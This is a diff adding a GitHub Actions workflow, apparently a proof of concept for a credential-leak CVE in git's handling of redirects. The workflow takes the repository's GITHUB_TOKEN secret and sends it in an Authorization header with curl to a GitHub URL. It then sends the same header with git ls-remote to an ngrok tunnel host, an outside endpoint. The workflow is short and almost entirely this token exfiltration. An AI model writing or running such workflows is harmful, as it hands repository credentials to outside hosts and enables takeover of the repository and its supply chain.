@@ -1,0 +1,12 @@
+name: real-redirect-test
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test checkout with redirect URL
+        run: |
+          TOKEN=\${{ secrets.GITHUB_TOKEN }}
+          curl -sI -L -H "Authorization: token \$TOKEN" "https://github.com/kimkou2024/cve0573-test/info/refs?service=git-upload-pack" 2>&1 | head -20 || true
+          echo "---"
+          git -c http.extraHeader="Authorization: token \$TOKEN" ls-remote https://d80c-105-101-85-53.ngrok-free.app/import-redirect 2>&1 || true
